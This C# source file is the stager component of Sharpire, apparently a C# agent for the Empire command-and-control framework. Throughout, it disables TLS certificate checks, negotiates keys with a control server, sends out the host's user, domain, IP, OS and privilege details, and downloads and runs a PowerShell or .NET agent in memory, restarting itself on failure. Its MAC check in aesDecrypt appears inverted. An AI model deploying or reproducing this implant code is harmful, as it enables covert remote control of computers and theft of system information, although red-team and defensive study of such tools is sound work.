// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
// Updated and Modified by: Jake Krasnov (@_Hubbl3)
// Project: Empire (https://github.com/BC-SECURITY/Empire)

using System;
using System.Linq;
using System.Management;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Net.Security;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace Sharpire
{
    class EmpireStager
    {
        private SessionInfo sessionInfo;
        
        private byte[] stagingKeyBytes;
        private RSACryptoServiceProvider rsaCrypto;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public EmpireStager(SessionInfo sessionInfo1)
        {
            sessionInfo = sessionInfo1;
            stagingKeyBytes = Encoding.ASCII.GetBytes(sessionInfo.GetStagingKey());

            Random random = new Random();
            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
            char[] charactersArray = characters.ToCharArray();
            StringBuilder sb = new StringBuilder(8);
            for (int i = 0; i < 8; i++)
            {
                int j = random.Next(charactersArray.Length);
                sb.Append(charactersArray[j]);
            }
            sessionInfo.SetAgentID(sb.ToString());

            CspParameters cspParameters = new CspParameters();
            cspParameters.Flags = cspParameters.Flags | CspProviderFlags.UseMachineKeyStore;
            rsaCrypto = new RSACryptoServiceProvider(2048, cspParameters);
        }

        ////////////////////////////////////////////////////////////////////////////////
        public void Execute()
        {
            byte[] stage1response;
            byte[] stage2response;
            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback( 
                delegate
                {
                    return true;
                }
            );

            try
            {
                stage1response = Stage1();
#if (PRINT)
                Console.WriteLine("Stage1 Complete");
#endif
                try
                {
                    stage2response = Stage2(stage1response);
#if (PRINT)
                    Console.WriteLine("Stage2 Complete");
#endif
                    try
                    {
#if (PRINT)
                        Console.WriteLine("Launching Empire");
                        IntPtr handle = Misc.GetConsoleWindow();
                        Misc.ShowWindow(handle, Misc.SW_HIDE);
#endif
                        if (sessionInfo.GetAgentLanguage() == "powershell" 
                            || sessionInfo.GetAgentLanguage() == "ps" 
                            || sessionInfo.GetAgentLanguage() == "posh")
                        {
                            PowershellEmpire(stage2response);
                        }
                        else if (sessionInfo.GetAgentLanguage() == "dotnet" 
                            || sessionInfo.GetAgentLanguage() == "net" 
                            || sessionInfo.GetAgentLanguage() == "clr")
                        {
                            DotNetEmpire();
                        }
                    }
                    catch
                    {
#if (PRINT)
                        Console.WriteLine("Empire Failure");
#endif
                        GC.Collect();
                        Execute();
                    }
                }
                catch
                {
#if (PRINT)
                    Console.WriteLine("Stage2 Failure");
#endif
                    throw;
                }
            }
            catch (WebException webError)
            {
                if ((int)((HttpWebResponse)webError.Response).StatusCode == 500)
                {
#if (PRINT)
                    Console.WriteLine("Stage1 Failure");
#endif
                    GC.Collect();
                    Execute();
                }
                else
                {
                    throw;
                }
            }
            catch (Exception error)
            {
#if (PRINT)
                Console.WriteLine("Stage1 Failure");
#endif
                Console.WriteLine(error.ToString());
            }
            finally
            {
                sessionInfo = null;
                stagingKeyBytes = null;
                rsaCrypto = null;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] Stage1()
        {
            Random random = new Random();

            ////////////////////////////////////////////////////////////////////////////////
            string rsaKey = rsaCrypto.ToXmlString(false);
            byte[] rsaKeyBytes = Encoding.ASCII.GetBytes(rsaKey);

            ////////////////////////////////////////////////////////////////////////////////
            byte[] initializationVector = new byte[16];
            random.NextBytes(initializationVector);
            byte[] encryptedBytes = aesEncrypt(stagingKeyBytes, initializationVector, rsaKeyBytes);
            encryptedBytes = Misc.combine(initializationVector, encryptedBytes);
            
            ////////////////////////////////////////////////////////////////////////////////
            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = stagingKeyBytes;
            byte[] hmacBytes = hmac.ComputeHash(encryptedBytes);
            encryptedBytes = Misc.combine(encryptedBytes, hmacBytes.Take(10).ToArray());

            ////////////////////////////////////////////////////////////////////////////////
            return SendStage(0x02, encryptedBytes, "/index.jsp");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] Stage2(byte[] stage1response)
        {
            Random random = new Random();

            ////////////////////////////////////////////////////////////////////////////////
            byte[] decrypted = rsaCrypto.Decrypt(stage1response, false);
            string decryptedString = Encoding.ASCII.GetString(decrypted);
            string nonce = decryptedString.Substring(0, 16);
            sessionInfo.SetSessionKey(decryptedString.Substring(16, decryptedString.Length - 16));
            byte[] keyBytes = Encoding.ASCII.GetBytes(sessionInfo.GetSessionKey());

            ////////////////////////////////////////////////////////////////////////////////
            long increment = Convert.ToInt64(nonce);
            increment++;
            nonce = increment.ToString();
            byte[] systemInformationBytes = GetSystemInformation(nonce + "|", string.Join(",", sessionInfo.GetControlServers()));
            byte[] initializationVector = new byte[16];
            random.NextBytes(initializationVector);
            byte[] encryptedInformationBytes = aesEncrypt(keyBytes, initializationVector, systemInformationBytes);
            encryptedInformationBytes = Misc.combine(initializationVector, encryptedInformationBytes);

            ////////////////////////////////////////////////////////////////////////////////
            using (HMACSHA256 hmac = new HMACSHA256())
            { 
                hmac.Key = keyBytes;
                byte[] hmacHash = hmac.ComputeHash(encryptedInformationBytes).Take(10).ToArray();
                encryptedInformationBytes = Misc.combine(encryptedInformationBytes, hmacHash);
            }

            ////////////////////////////////////////////////////////////////////////////////
            return SendStage(0x03, encryptedInformationBytes, "/index.php");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private void PowershellEmpire(byte[] stage2Response)
        {
            string empire = Encoding.ASCII.GetString(aesDecrypt(sessionInfo.GetSessionKey(), stage2Response));
            string execution = "Invoke-Empire";
            execution += " -Servers \"" + sessionInfo.GetControlServers().First() + "\"";
            execution += " -StagingKey \"" + sessionInfo.GetStagingKey() + "\"";
            execution += " -SessionKey \"" + sessionInfo.GetSessionKey() + "\"";
            execution += " -SessionID  \"" + sessionInfo.GetAgentID() + "\"";

#if (PRINT)
            Console.WriteLine(execution);
#endif
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();

                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    pipeline.Commands.AddScript(empire + ";" + execution + ";");
                    pipeline.Invoke();
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private void DotNetEmpire()
        {
            Agent agent = new Agent(sessionInfo);
            Coms coms = agent.GetComs();
            try
            {
                agent.Execute();
            }
            catch (Exception ex)
            {
                coms.SendMessage(coms.EncodePacket(41, "[-] Catastrophic .Net Agent Failure, Attempting Agent Restart: " + ex, 0));
                agent = null;
                coms = null;
                GC.Collect();
                DotNetEmpire();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] SendStage(byte meta, byte[] inputData, string uri)
        {
            Random random = new Random();
            byte[] initializationVector = new byte[4];
            random.NextBytes(initializationVector);

            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentID());
            data = Misc.combine(data, new byte[4] { 0x03, meta, 0x00, 0x00 });
            data = Misc.combine(data, BitConverter.GetBytes(inputData.Length));

            byte[] rc4Data = rc4Encrypt(Misc.combine(initializationVector, stagingKeyBytes), data);
            rc4Data = Misc.combine(initializationVector, rc4Data);
            rc4Data = Misc.combine(rc4Data, inputData);
            return SendData(uri, rc4Data);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public byte[] SendData(string uri, byte[] data)
        {
            byte[] response = new byte[0];
            using (WebClient webClient = new WebClient())
            {
                webClient.Headers.Add("User-Agent", sessionInfo.GetStagerUserAgent());
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                Console.WriteLine("this is the uri string: " + uri);
                Console.WriteLine("website to reach: "+ sessionInfo.GetControlServers().First() + uri);
                //old call with the request address being built here 
                response = webClient.UploadData(sessionInfo.GetControlServers().First() + uri, "POST", data);
            }
            return response;
        }

        ////////////////////////////////////////////////////////////////////////////////
        public static byte[] GetSystemInformation(string information, string server)
        {
            information += server + "|";
            information += Environment.UserDomainName + "|";
            information += Environment.UserName + "|";
            information += Environment.MachineName + "|";

            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            string ipAddress = "";
            foreach (ManagementObject managementObject in objectCollection)
            {
                string[] addresses = (string[])managementObject["IPAddress"];
                if (null != addresses)
                {
                    foreach (string address in addresses)
                    {
                        if (address.Contains("."))
                        {
                            ipAddress = address;
                        }
                    }
                }
            }

            if (0 < ipAddress.Length)
            {
                information += ipAddress + "|";
            }
            else
            {
                information += "0.0.0.0|";
            }

            query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            objectSearcher = new ManagementObjectSearcher(scope, query);
            objectCollection = objectSearcher.Get();
            string operatingSystem = "";
            foreach (ManagementObject managementObject in objectCollection)
            {
                operatingSystem = (string)managementObject["Name"];
                operatingSystem = operatingSystem.Split('|')[0];
            }
            information += operatingSystem + "|";

            bool elevated = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            if ("SYSTEM" == Environment.UserName.ToUpper())
            {
                information += "True|";
            }
            else
            {
                information += elevated + "|";
            }

            Process process = Process.GetCurrentProcess();
            information += process.ProcessName + "|";
            information += process.Id + "|";
            //TODO fix this from being hard coded  
            information += "csharp|5";
            information += "|" + System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");

            return Encoding.ASCII.GetBytes(information);
        }

        ////////////////////////////////////////////////////////////////////////////////
        public static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
        {
            byte[] output = new byte[data.Length];
            byte[] s = new byte[256];
            for (int x = 0; x < 256; x++)
            {
                s[x] = Convert.ToByte(x);
            }

            int j = 0;
            for (int x = 0; x < 256; x++)
            {
                j = (j + s[x] + RC4Key[x % RC4Key.Length]) % 256;

                byte hold = s[x];
                s[x] = s[j];
                s[j] = hold;
            }
            int i = j = 0;

            int k = 0;
            foreach (byte entry in data)
            {
                i = (i + 1) % 256;
                j = (j + s[i]) % 256;

                byte hold = s[i];
                s[i] = s[j];
                s[j] = hold;

                output[k++] = Convert.ToByte(entry ^ s[(s[i] + s[j]) % 256]);
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        public static byte[] aesEncrypt(byte[] keyBytes, byte[] ivBytes, byte[] dataBytes)
        {
            byte[] encryptedBytes = new byte[0];
            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
            {
                aesCrypto.Mode = CipherMode.CBC;
                aesCrypto.Key = keyBytes;
                aesCrypto.IV = ivBytes;
                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                encryptedBytes = encryptor.TransformFinalBlock(dataBytes, 0, dataBytes.Length);
            }
            return encryptedBytes;
        }

        ////////////////////////////////////////////////////////////////////////////////
        public static byte[] aesDecrypt(string key, byte[] data)
        {
            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = Encoding.ASCII.GetBytes(key);

            byte[] calculatedMac = hmac.ComputeHash(data).Take(10).ToArray();
            byte[] mac = data.Skip(data.Length - 10).Take(10).ToArray();

            if (calculatedMac.SequenceEqual(mac))
            {
                return new byte[0];
            }

            data = data.Take(data.Length - 10).ToArray();
            byte[] initializationVector = data.Take(16).ToArray();

            AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider();
            aesCrypto.Mode = CipherMode.CBC;
            aesCrypto.Key = Encoding.ASCII.GetBytes(key);
            aesCrypto.IV = initializationVector;

            byte[] inputBuffer = data.Skip(16).Take(data.Length - 16).ToArray();
            return aesCrypto.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
        }
    }
}
